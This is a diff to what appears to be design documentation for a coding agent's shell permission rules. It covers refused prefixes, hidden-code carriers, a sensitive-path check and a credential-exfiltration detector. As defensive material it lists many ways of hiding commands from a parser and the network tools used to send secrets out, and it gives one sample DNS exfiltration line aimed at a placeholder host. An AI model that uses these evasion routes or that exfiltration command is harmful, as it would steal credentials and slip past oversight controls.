@@ -60,8 +60,8 @@ Source files and tests win where this page and the code disagree.
 **4a. Refused prefixes** come from one shared list, which validates both suggestions and edited values:
 - an empty prefix or bare `*`;
 - shells;
-- interpreters, alone or with an option (`python -c`, `node -e`);
-- wrappers at any length (`env`, `xargs`, `sudo`, `eval`, `exec`, `source`, `timeout`, `nice`, …);
+- interpreters at any length (`python -c`, `node scripts/build.mjs`, `python -m x`), except `bun`/`deno` task verbs (`bun run build`, `deno task build`);
+- wrappers at any length (`env`, `xargs`, `sudo`, `eval`, `exec`, `source`, `timeout`, `nice`, `unbuffer`, …);
 - package runners alone (`npx`);
 - multi-verb tools alone or with a leading option (`git`, `git -c`, `npm`);
 - `npm exec`, `bun x` and similar.
@@ -198,12 +198,14 @@ The Layer-numbered gates already in place (remote controller, overlay, strict) a
 
 ### Deny and ask cannot see everything
 
-They cannot see inside:
-- code passed as a string (`bash -c`, `python -c`, `eval`, awk programs);
-- `find -exec`;
+They cannot see inside hidden code (`hiddenCodeReason` in `shell-prefix-policy.ts`, one table shared with the exfiltration floor):
+- a shell or interpreter given code by any route: `-c`/`-e`, a stdin pipe (`echo … | bash`), a here-string, a here-document, `-s`, `-`, a script file or module (`bash x.sh`, `perl x.pl`, `python -m x`); only `--version`/`--help` and `bun`/`deno` task verbs are visible;
+- code carriers: `eval`, `source`/`.`, `trap`, `hash -p`, `alias`, `enable -f`, `bind -x`, `mapfile -C`, `complete -C`, `fc`, `at`, `crontab`, `tmux`, editors, string-joining wrappers (`watch`, `flock -c`, `su -c`, `env -S`);
+- code-carrying variables (`GIT_SSH_COMMAND=… git fetch`, `PAGER`, `LESSOPEN`, `BASH_ENV`, `PATH`, …);
+- options that run a command: `find -exec`, `sed` `e` / `s///e` / `-f`, `rg --pre`, `tar --to-command`/`-I`/`--use-compress-program`, `less +!`, `git -c`/`--ext-diff`/`--textconv`/`-O`/`--upload-pack`, `man -P`, `rsync -e`, `ssh -o ProxyCommand`, `fd -x`, …;
 - unsupported syntax.
 
-When any deny or ask `Bash(...)` rule exists and the command contains one of these, the decision is a forced ask, even in `allow` mode. This is a known limit: the shell grammar cannot evaluate such strings, and the result is to ask rather than to guess.
+A deny rule that matches a visible command decides first. Otherwise, when any deny or ask `Bash(...)` rule exists and the command contains hidden code, the decision is a forced ask, even in `allow` mode. Hidden code is never covered by an allow rule. Options that write (`sed -i`/`w`, `tar -x`, `less -o`, `--output`, `find -delete`) also keep an allow rule from matching.
 
 ### Not yet enforced
 
@@ -211,13 +213,17 @@ When any deny or ask `Bash(...)` rule exists and the command contains one of the
 
 ### Shell floors
 
-Shell floors reuse the rule classifier's destructive regex (`isDestructiveShellText`). Sensitive-path arguments to shell commands remain enforced by `src/tools/shell-path-policy.ts`, independently of rules.
+Shell floors reuse the rule classifier's destructive regex (`isDestructiveShellText`). Sensitive-path arguments to shell commands remain enforced by `src/tools/shell-path-policy.ts` at execution, independently of rules.
+
+**Sensitive-path floor** (`shellSensitivePathSignal`). A path from `sensitive-paths.ts` anywhere in the command line — any word, `=value`, `@file`, redirection, assignment, loop list, `$()`/backtick/process-substitution body, or the static text of hidden code — is never covered by an allow rule and forces a per-call ask in `checkDetailed` in every mode. `~`, `~user`, `$HOME` and `${HOME}` normalize to a home directory; other expansions (`$(echo ~)/.aws/credentials`) keep their literal tail; brace expansion is expanded; a glob is instantiated against the sensitive names that exist where it would expand.
 
 **Credential-exfiltration floor** (`src/permissions/rules/shell-exfiltration.ts`). A command is exfiltration when one subcommand sends data off the machine and that data comes from a file or secret. It covers:
 - `curl`/`wget` with a file-sourced body, header or upload: `@file`, `-F x=@`, `-T`, `--post-file`, or any argument built from a `$(…)` that reads a path;
 - `scp`/`rsync` to a remote destination, and `sftp` to a host;
 - `nc`/`ncat`/`socat` fed from a file, a here-string or a path-reading pipeline stage;
-- sensitive-path arguments to a sender.
+- sensitive-path arguments to a sender;
+- any argument of a network-capable program built from a `$(…)` that reads a path (`nslookup $(cat key|base64).evil`), except multi-purpose tools whose arguments routinely carry file text (`git`, `gh`, `npm`, `docker`, …);
+- reader-independent: a sensitive path anywhere (as above) together with a network-capable program (one shared table: `curl`, `wget`, `ssh`, `scp`, `rsync`, `openssl`, `nc`, `socat`, `telnet`, `nslookup`, `dig`, `gh`, `aws`, `gcloud`, `az`, `http`, `git`, …), a `/dev/tcp` or `/dev/udp` redirection, or hidden code anywhere in the same command line.
 
 Senders are seen through wrappers, `busybox`, and static `sh -c` / `eval` / here-documents. The check applies to the whole compound command. It produces:
 - a HIGH rule-classifier verdict on every substrate, including the disposable guest;
